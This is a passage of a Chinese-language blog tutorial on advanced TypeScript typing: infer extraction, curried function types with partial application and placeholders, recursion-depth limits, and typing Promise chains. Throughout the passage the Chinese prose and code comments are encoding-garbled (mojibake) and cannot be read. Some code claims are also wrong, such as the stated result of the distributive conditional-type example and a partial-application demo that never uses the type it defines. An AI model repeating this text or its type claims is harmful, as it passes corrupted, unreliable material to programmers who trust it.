<span class="hljs-built_in">never</span>;<br></code></pre></td></tr></table></figure><ol start="2"><li>é”™è¯¯å¤„ç†æ¨¡å¼ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// å®‰å…¨æå–æ¨¡å¼</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">SafeExtract</span>&lt;T, <span class="hljs-title class_">Fallback</span> = <span class="hljs-built_in">never</span>&gt; = <br>  T <span class="hljs-keyword">extends</span> &#123; [<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>]: infer V &#125; ? V : <span class="hljs-title class_">Fallback</span>;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Value</span> = <span class="hljs-title class_">SafeExtract</span>&lt;<span class="hljs-built_in">string</span>&gt;; <span class="hljs-comment">// never</span><br></code></pre></td></tr></table></figure><ol start="3"><li>å¤æ‚ç±»å‹åˆ†è§£ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// åˆ†è§£å¤æ‚æå–é€»è¾‘</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Step1</span>&lt;T&gt; = <span class="hljs-comment">/* ... */</span>;<br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Step2</span>&lt;T&gt; = <span class="hljs-title class_">Step1</span>&lt;T&gt; <span class="hljs-keyword">extends</span> infer U ? <span class="hljs-comment">/* ... */</span> : <span class="hljs-built_in">never</span>;<br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Final</span>&lt;T&gt; = <span class="hljs-title class_">Step2</span>&lt;T&gt; <span class="hljs-keyword">extends</span> infer V ? <span class="hljs-comment">/* ... */</span> : <span class="hljs-built_in">never</span>;<br></code></pre></td></tr></table></figure><ol start="4"><li>ç±»å‹æµ‹è¯•ç­–ç•¥ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ä½¿ç”¨ç±»å‹æ–­è¨€éªŒè¯</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Assert</span>&lt;T, <span class="hljs-title class_">Expected</span>&gt; = <br>  T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Expected</span> ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>;<br><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Test1</span> = <span class="hljs-title class_">Assert</span>&lt;<span class="hljs-title class_">ReturnType</span>&lt;<span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">string</span>&gt;, <span class="hljs-built_in">string</span>&gt;; <span class="hljs-comment">// true</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Test2</span> = <span class="hljs-title class_">Assert</span>&lt;<span class="hljs-title class_">FirstParam</span>&lt;<span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">a</span>: <span class="hljs-built_in">number</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>&gt;, <span class="hljs-built_in">string</span>&gt;; <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><p><strong>infer ç±»å‹å…³ç³»å›¾</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs text">infer åº”ç”¨ä½“ç³»<br>â”œâ”€ åŸºç¡€æå–<br>â”‚  â”œâ”€ å‡½æ•°è¿”å›å€¼ â†’ ReturnType<br>â”‚  â”œâ”€ å‡½æ•°å‚æ•° â†’ Parameters<br>â”‚  â””â”€ æ•°ç»„å…ƒç´  â†’ ArrayElement<br>â”‚<br>â”œâ”€ æ¨¡å¼åŒ¹é…<br>â”‚  â”œâ”€ å­—ç¬¦ä¸²æ¨¡æ¿ â†’ ExtractVariable<br>â”‚  â”œâ”€ å¯¹è±¡ç»“æ„ â†’ ValueOfKey<br>â”‚  â””â”€ æ¡ä»¶åˆ†æ”¯ â†’ ExtractByType<br>â”‚<br>â””â”€ é«˜çº§ä½“æ“<br>   â”œâ”€ å…ƒç»„è½¬æ¢ â†’ MapTuple<br>   â”œâ”€ æŸ¯é‡ŒåŒ– â†’ Curry<br>   â””â”€ é€’å½’å±•å¼€ â†’ Expand<br></code></pre></td></tr></table></figure><h2 id="2-2-ç±»å‹ä½“æ“å®æˆ˜"><a href="#2-2-ç±»å‹ä½“æ“å®æˆ˜" class="headerlink" title="2.2 ç±»å‹ä½“æ“å®æˆ˜"></a>2.2 ç±»å‹ä½“æ“å®æˆ˜</h2><h3 id="2-2-1-å‡½æ•°æŸ¯é‡ŒåŒ–ç±»å‹å®šä¹‰"><a href="#2-2-1-å‡½æ•°æŸ¯é‡ŒåŒ–ç±»å‹å®šä¹‰" class="headerlink" title="2.2.1 å‡½æ•°æŸ¯é‡ŒåŒ–ç±»å‹å®šä¹‰"></a>2.2.1 å‡½æ•°æŸ¯é‡ŒåŒ–ç±»å‹å®šä¹‰</h3><p><strong>æŸ¯é‡ŒåŒ–æ ¸å¿ƒæ¦‚å¿µ</strong></p><ul><li>æŸ¯é‡ŒåŒ–ï¼ˆCurryingï¼‰ï¼šå°†å¤šå‚æ•°å‡½æ•°è½¬åŒ–ä¸ºä¸€ç³»åˆ—å•å‚æ•°å‡½æ•°çš„è¿‡ç¨‹</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// åŸå§‹å‡½æ•°</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">add</span> = (<span class="hljs-params"><span class="hljs-attr">a</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">b</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">c</span>: <span class="hljs-built_in">number</span></span>) =&gt; a + b + c;<br><br><span class="hljs-comment">// æŸ¯é‡ŒåŒ–å</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">curriedAdd</span> = (<span class="hljs-params"><span class="hljs-attr">a</span>: <span class="hljs-built_in">number</span></span>) =&gt; <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">b</span>: <span class="hljs-built_in">number</span></span>) =&gt;</span> <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">c</span>: <span class="hljs-built_in">number</span></span>) =&gt;</span> a + b + c;<br></code></pre></td></tr></table></figure><ul><li>ç±»å‹æŒ‘æˆ˜ï¼š<ul><li>åŠ¨æ€æ¨å¯¼å‰©ä½™å‚æ•°ç±»å‹</li><li>å¤„ç†å‚æ•°æ•°é‡ä¸ç¡®å®šçš„æƒ…å†µ</li><li>ä¿æŒè¿”å›å‡½æ•°çš„é“¾å¼è°ƒç”¨ç±»å‹å®‰å…¨</li></ul></li></ul><p><strong>åŸºç¡€æŸ¯é‡ŒåŒ–ç±»å‹å®ç°</strong></p><p>åœºæ™¯1ï¼šå›ºå®šå‚æ•°é•¿åº¦çš„æŸ¯é‡ŒåŒ–</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Curry1</span>&lt;T&gt; = T <span class="hljs-title function_">extends</span> (<span class="hljs-attr">a</span>: infer A) =&gt; infer R ? <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">a</span>: A</span>) =&gt;</span> R : <span class="hljs-built_in">never</span>;<br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Curry2</span>&lt;T&gt; = T <span class="hljs-title function_">extends</span> (<span class="hljs-attr">a</span>: infer A, <span class="hljs-attr">b</span>: infer B) =&gt; infer R <br>  ? <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">a</span>: A</span>) =&gt;</span> <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">b</span>: B</span>) =&gt;</span> R <br>  : <span class="hljs-built_in">never</span>;<br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Curry3</span>&lt;T&gt; = T <span class="hljs-title function_">extends</span> (<span class="hljs-attr">a</span>: infer A, <span class="hljs-attr">b</span>: infer B, <span class="hljs-attr">c</span>: infer C) =&gt; infer R <br>  ? <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">a</span>: A</span>) =&gt;</span> <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">b</span>: B</span>) =&gt;</span> <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">c</span>: C</span>) =&gt;</span> R <br>  : <span class="hljs-built_in">never</span>;<br><br><span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span><br><span class="hljs-keyword">declare</span> <span class="hljs-keyword">function</span> curry&lt;T&gt;(<span class="hljs-attr">fn</span>: T): <br>  T <span class="hljs-title function_">extends</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>) =&gt; <span class="hljs-built_in">any</span> ? <span class="hljs-title class_">Curry3</span>&lt;T&gt; : <span class="hljs-built_in">never</span>;<br><br><span class="hljs-keyword">const</span> curriedAdd = <span class="hljs-title function_">curry</span>(add); <span class="hljs-comment">// ç±»å‹: (a: number) =&gt; (b: number) =&gt; (c: number) =&gt; number</span><br></code></pre></td></tr></table></figure><p>åœºæ™¯2ï¼šåŠ¨æ€å‚æ•°é•¿åº¦çš„æŸ¯é‡ŒåŒ–</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Curry</span>&lt;F&gt; = F <span class="hljs-title function_">extends</span> (...<span class="hljs-attr">args</span>: infer <span class="hljs-title class_">Args</span>) =&gt; infer <span class="hljs-title class_">Return</span><br>  ? <span class="hljs-title class_">Args</span> <span class="hljs-keyword">extends</span> [infer <span class="hljs-title class_">First</span>, ...infer <span class="hljs-title class_">Rest</span>]<br>    ? <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">arg</span>: <span class="hljs-title class_">First</span></span>) =&gt;</span> <span class="hljs-title class_">Curry</span>&lt;<span class="hljs-function">(<span class="hljs-params">...<span class="hljs-attr">args</span>: <span class="hljs-title class_">Rest</span></span>) =&gt;</span> <span class="hljs-title class_">Return</span>&gt;<br>    : <span class="hljs-title class_">Return</span> <span class="hljs-comment">// ç»ˆæ­¢æ¡ä»¶ï¼šæ— å‰©ä½™å‚æ•°</span><br>  : <span class="hljs-built_in">never</span>;<br><br><span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span><br><span class="hljs-keyword">const</span> dynamicCurry = &lt;F <span class="hljs-title function_">extends</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>) =&gt; <span class="hljs-built_in">any</span>&gt;(<span class="hljs-attr">fn</span>: F): <span class="hljs-title class_">Curry</span>&lt;F&gt; =&gt; &#123;<br>  <span class="hljs-comment">// å®ç°ç•¥...</span><br>&#125;;<br><br><span class="hljs-keyword">const</span> curried = <span class="hljs-title function_">dynamicCurry</span>(<span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">a</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">b</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">c</span>: <span class="hljs-built_in">boolean</span></span>) =&gt;</span> &#123;&#125;);<br><span class="hljs-comment">// ç±»å‹: (arg: string) =&gt; (arg: number) =&gt; (arg: boolean) =&gt; void</span><br></code></pre></td></tr></table></figure><p><strong>é«˜çº§æŸ¯é‡ŒåŒ–ç±»å‹æŠ€å·§</strong></p><p>æŠ€å·§1ï¼šæ”¯æŒéƒ¨åˆ†åº”ç”¨ï¼ˆPartial Applicationï¼‰</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">PartialCurry</span>&lt;F&gt; = F <span class="hljs-title function_">extends</span> (...<span class="hljs-attr">args</span>: infer <span class="hljs-title class_">Args</span>) =&gt; infer R<br>  ? &lt;P <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Partial</span>&lt;<span class="hljs-title class_">Args</span>&gt;&gt;<span class="hljs-function">(<span class="hljs-params">...<span class="hljs-attr">args</span>: P</span>) =&gt;</span> <br>      <span class="hljs-title class_">Args</span> <span class="hljs-keyword">extends</span> [...<span class="hljs-title class_">SameLength</span>&lt;P&gt;, ...infer <span class="hljs-title class_">Rest</span>] <br>        ? <span class="hljs-title class_">Rest</span> <span class="hljs-keyword">extends</span> [] <br>          ? R <br>          : <span class="hljs-title class_">PartialCurry</span>&lt;<span class="hljs-function">(<span class="hljs-params">...<span class="hljs-attr">args</span>: <span class="hljs-title class_">Rest</span></span>) =&gt;</span> R&gt;<br>        : <span class="hljs-built_in">never</span><br>  : <span class="hljs-built_in">never</span>;<br><br><span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span><br><span class="hljs-keyword">const</span> partialAdd = <span class="hljs-title function_">dynamicCurry</span>(add);<br><span class="hljs-keyword">const</span> add10 = <span class="hljs-title function_">partialAdd</span>(<span class="hljs-number">10</span>); <span class="hljs-comment">// ç±»å‹: (b: number) =&gt; (c: number) =&gt; number</span><br></code></pre></td></tr></table></figure><p>æŠ€å·§2ï¼šå ä½ç¬¦æ”¯æŒï¼ˆPlaceholderï¼‰</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">const</span> _ = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;placeholder&#x27;</span>);<br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Placeholder</span> = <span class="hljs-keyword">typeof</span> _;<br><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">CurryWithPlaceholder</span>&lt;F, <span class="hljs-title class_">Original</span> = F&gt; = <br>  F <span class="hljs-title function_">extends</span> (...<span class="hljs-attr">args</span>: infer <span class="hljs-title class_">Args</span>) =&gt; infer R<br>    ? &lt;P <span class="hljs-keyword">extends</span> <span class="hljs-title class_">CurryArgs</span>&lt;<span class="hljs-title class_">Args</span>&gt;&gt;<span class="hljs-function">(<span class="hljs-params">...<span class="hljs-attr">args</span>: P</span>) =&gt;</span> <br>        <span class="hljs-title class_">IsComplete</span>&lt;P, <span class="hljs-title class_">Args</span>&gt; <span class="hljs-keyword">extends</span> <span class="hljs-literal">true</span> <br>          ? R <br>          : <span class="hljs-title class_">CurryWithPlaceholder</span>&lt;<span class="hljs-function">(<span class="hljs-params">...<span class="hljs-attr">args</span>: <span class="hljs-title class_">Remaining</span>&lt;P, <span class="hljs-title class_">Args</span>&gt;</span>) =&gt;</span> R, <span class="hljs-title class_">Original</span>&gt;<br>    : <span class="hljs-built_in">never</span>;<br><br><span class="hljs-comment">// å®Œæ•´å®ç°éœ€å®šä¹‰è¾…åŠ©ç±»å‹ï¼š</span><br><span class="hljs-comment">// - CurryArgsï¼šå¤„ç†å ä½ç¬¦çš„å‚æ•°ç±»å‹</span><br><span class="hljs-comment">// - Remainingï¼šè®¡ç®—å‰©ä½™å‚æ•°</span><br><span class="hljs-comment">// - IsCompleteï¼šæ£€æŸ¥å‚æ•°æ˜¯å¦å®Œæ•´</span><br></code></pre></td></tr></table></figure><p><strong>å·¥ç¨‹å®è·µä¸è¾¹ç•Œå¤„ç†</strong></p><p>è¾¹ç•Œæƒ…å†µå¤„ç†æ–¹æ¡ˆï¼š</p><table><thead><tr><th align="left">åœºæ™¯</th><th align="left">è§£å†³æ–¹æ¡ˆ</th></tr></thead><tbody><tr><td align="left">ç©ºå‚æ•°è°ƒç”¨</td><td align="left">è¿”å›åŸå§‹å‡½æ•°</td></tr><tr><td align="left">å‚æ•°æ•°é‡è¶…è¿‡åŸå‡½æ•°</td><td align="left">ç¼–è¯‘æ—¶æŠ¥é”™</td></tr><tr><td align="left">æ··åˆç±»å‹å‚æ•°</td><td align="left">ä½¿ç”¨æ³›å‹çº¦æŸä¿æŒç±»å‹å®‰å…¨</td></tr><tr><td align="left">å¯é€‰å‚æ•°å¤„ç†</td><td align="left">ä½¿ç”¨æ¡ä»¶ç±»å‹åˆ¤æ–­å‚æ•°æ˜¯å¦å¿…é¡»</td></tr></tbody></table><p>æ€§èƒ½ä¼˜åŒ–ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// é¿å…æ·±å±‚é€’å½’ï¼ˆé™åˆ¶å‚æ•°æœ€å¤§æ•°é‡ï¼‰</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">MaxParams</span> = <span class="hljs-number">8</span>; <span class="hljs-comment">// æ ¹æ®å®é™…éœ€æ±‚è®¾å®š</span><br><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">SafeCurry</span>&lt;F, <span class="hljs-title class_">Depth</span> <span class="hljs-keyword">extends</span> <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>&gt; = <br>  <span class="hljs-title class_">Depth</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">MaxParams</span> <br>    ? F <span class="hljs-comment">// è¾¾åˆ°æ·±åº¦é™åˆ¶æ—¶ç»ˆæ­¢</span><br>    : F <span class="hljs-title function_">extends</span> (...<span class="hljs-attr">args</span>: infer <span class="hljs-title class_">Args</span>) =&gt; infer R<br>      ? <span class="hljs-title class_">Args</span> <span class="hljs-keyword">extends</span> [infer <span class="hljs-title class_">First</span>, ...infer <span class="hljs-title class_">Rest</span>]<br>        ? <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">arg</span>: <span class="hljs-title class_">First</span></span>) =&gt;</span> <span class="hljs-title class_">SafeCurry</span>&lt;<span class="hljs-function">(<span class="hljs-params">...<span class="hljs-attr">args</span>: <span class="hljs-title class_">Rest</span></span>) =&gt;</span> R, <span class="hljs-title class_">Add</span>&lt;<span class="hljs-title class_">Depth</span>, <span class="hljs-number">1</span>&gt;&gt;<br>        : R<br>      : <span class="hljs-built_in">never</span>;<br></code></pre></td></tr></table></figure><p><strong>é¢è¯•çº§è€ƒç‚¹</strong></p><ul><li>ç±»å‹é€’å½’æ·±åº¦é™åˆ¶ï¼šTypeScript é»˜è®¤é€’å½’æ·±åº¦é™åˆ¶ï¼ˆçº¦50å±‚ï¼‰</li><li>æ¡ä»¶ç±»å‹åˆ†å‘æœºåˆ¶ï¼š</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// è”åˆç±»å‹åœ¨æ¡ä»¶ç±»å‹ä¸­çš„åˆ†å‘è¡Œä¸º</span><br><span class="hljs-keyword">type</span> T = [<span class="hljs-built_in">string</span>] | [<span class="hljs-built_in">number</span>] <span class="hljs-keyword">extends</span> [infer A] ? A : <span class="hljs-built_in">never</span>;<br><span class="hljs-comment">// ç»“æœ: string | number</span><br></code></pre></td></tr></table></figure><ul><li>å‚æ•°é€†å˜é—®é¢˜ï¼š</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">declare</span> <span class="hljs-keyword">function</span> curry&lt;P <span class="hljs-keyword">extends</span> <span class="hljs-built_in">any</span>[], R&gt;(<span class="hljs-attr">fn</span>: <span class="hljs-function">(<span class="hljs-params">...<span class="hljs-attr">args</span>: P</span>) =&gt;</span> R): <br>  &lt;A <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Partial</span>&lt;P&gt;&gt;<span class="hljs-function">(<span class="hljs-params">...<span class="hljs-attr">args</span>: A</span>) =&gt;</span> <span class="hljs-built_in">unknown</span>; <span class="hljs-comment">// éœ€è¦å¤„ç†é€†å˜</span><br></code></pre></td></tr></table></figure><ul><li>å®é™…åº”ç”¨åœºæ™¯ï¼š<ul><li>Redux çš„ connect å‡½æ•°</li><li>React çš„é«˜é˜¶ç»„ä»¶</li><li>é…ç½®åŒ–è¡¨å•éªŒè¯é“¾</li></ul></li></ul><h3 id="2-2-2-Promise-é“¾å¼è°ƒç”¨ç±»å‹æ¨å¯¼"><a href="#2-2-2-Promise-é“¾å¼è°ƒç”¨ç±»å‹æ¨å¯¼" class="headerlink" title="2.2.2 Promise é“¾å¼è°ƒç”¨ç±»å‹æ¨å¯¼"></a>2.2.2 Promise é“¾å¼è°ƒç”¨ç±»å‹æ¨å¯¼</h3><p><strong>æ ¸å¿ƒç±»å‹æŒ‘æˆ˜</strong></p><table><thead><tr><th align="left">é—®é¢˜</th><th align="left">ç±»å‹è¡¨ç°</th><th align="left">è§£å†³æ–¹æ¡ˆ</th></tr></thead><tbody><tr><td align="left">åˆå§‹å€¼ç±»å‹ä¸¢å¤±</td><td align="left"><code>Promise.resolve(42).then(v =&gt; v) â†’ v: unknown</code></td><td align="left">æ³›å‹æ•è·åˆå§‹ç±»å‹</td></tr><tr><td align="left">é“¾å¼è¿”å›å€¼ç±»å‹æ¨å¯¼</td><td align="left"><code>.then(x =&gt; x.toFixed())</code> â†’ æ¨å¯¼å¤±è´¥</td><td align="left">æ¡ä»¶ç±»å‹ + å‡½æ•°è¿”å›å€¼æ¨æ–­</td></tr><tr><td align="left">é”™è¯¯ç±»å‹ä¼ é€’ä¸­æ–­</td><td align="left"><code>.catch(e =&gt; e.message)</code> â†’ e: any</td><td align="left">æ³›å‹çº¦æŸé”™è¯¯ç±»å‹</td></tr><tr><td align="left">åŒæ­¥&#x2F;å¼‚æ­¥æ··åˆé“¾</td><td align="left"><code>Promise.resolve().then(() =&gt; 42)</code> â†’ ç±»å‹æ–­è£‚</td><td align="left">é€’å½’è§£åŒ… Promise åµŒå¥—</td></tr></tbody></table><p><strong>åŸºç¡€é“¾å¼è°ƒç”¨ç±»å‹å®ç°</strong></p><p>åœºæ™¯1ï¼šåŸºç¡€ Promise ç±»å‹å®šä¹‰</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">MyPromise</span>&lt;T&gt; &#123;<br>  then&lt;U&gt;(<br>    <span class="hljs-attr">onFulfilled</span>?: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">value</span>: T</span>) =&gt;</span> U | <span class="hljs-title class_">PromiseLike</span>&lt;U&gt;<br>  ): <span class="hljs-title class_">MyPromise</span>&lt;U&gt;;<br>  <br>  <span class="hljs-keyword">catch</span>&lt;U&gt;(<br>    <span class="hljs-attr">onRejected</span>?: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">reason</span>: <span class="hljs-built_in">any</span></span>) =&gt;</span> U | <span class="hljs-title class_">PromiseLike</span>&lt;U&gt;<br>  ): <span class="hljs-title class_">MyPromise</span>&lt;T | U&gt;;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span><br><span class="hljs-keyword">declare</span> <span class="hljs-keyword">function</span> createPromise&lt;T&gt;(<span class="hljs-attr">executor</span>: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">resolve</span>: (value: T) =&gt; <span class="hljs-built_in">void</span></span>) =&gt;</span> <span class="hljs-title class_">MyPromise</span>&lt;T&gt;;<br></code></pre></td></tr></table></figure><p>åœºæ™¯2ï¼šé“¾å¼è¿”å›å€¼ç±»å‹æ¨å¯¼</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">UnwrapPromise</span>&lt;T&gt; = <br>  T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Promise</span>&lt;infer U&gt; ? <span class="hljs-title class_">UnwrapPromise</span>&lt;U&gt; : T;<br><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">MyPromise</span>&lt;T&gt; &#123;<br>  then&lt;U&gt;(<br>    <span class="hljs-attr">onFulfilled</span>: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">value</span>: T</span>) =&gt;</span> U<br>  ): <span class="hljs-title class_">MyPromise</span>&lt;<span class="hljs-title class_">UnwrapPromise</span>&lt;U&gt;&gt;;<br>&#125;<br><br><span class="hljs-comment">// æµ‹è¯•</span><br><span class="hljs-keyword">const</span> chain = <span class="hljs-title function_">createPromise</span>(<span class="hljs-number">42</span>)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">v</span> =&gt;</span> v.<span class="hljs-title function_">toFixed</span>())    <span class="hljs-comment">// v: number â†’ string</span><br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">s</span> =&gt;</span> <span class="hljs-built_in">parseInt</span>(s));   <span class="hljs-comment">// s: string â†’ number</span><br></code></pre></td></tr></table></figure><p><strong>é«˜çº§é“¾å¼ç±»å‹æŠ€å·§</strong></p><p>æŠ€å·§1ï¼šè‡ªåŠ¨è§£åŒ…åµŒå¥— Promise</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">UnwrapPromise</span>&lt;T&gt; = <br>  T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Promise</span>&lt;infer U&gt; ? <span class="hljs-title class_">UnwrapPromise</span>&lt;U&gt; : <br>  T <span class="hljs-title function_">extends</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>) =&gt; <span class="hljs-title class_">Promise</span>&lt;infer V&gt; ? <span class="hljs-title class_">UnwrapPromise</span>&lt;V&gt; : <br>  T;<br><br><span class="hljs-comment">// å¤„ç†å¤šå±‚åµŒå¥—</span><br><span class="hljs-keyword">const</span> nested = <span class="hljs-title function_">createPromise</span>(<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-number">42</span>)));<br><span class="hljs-comment">// ç±»å‹: MyPromise&lt;number&gt; è€Œé MyPromise&lt;Promise&lt;Promise&lt;number&gt;&gt;&gt;</span><br></code></pre></td></tr></table></figure><p>æŠ€å·§2ï¼šé”™è¯¯ç±»å‹çº¦æŸ</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">MyPromise</span>&lt;T, E = <span class="hljs-title class_">Error</span>&gt; &#123;<br>  <span class="hljs-keyword">catch</span>&lt;U&gt;(<br>    <span 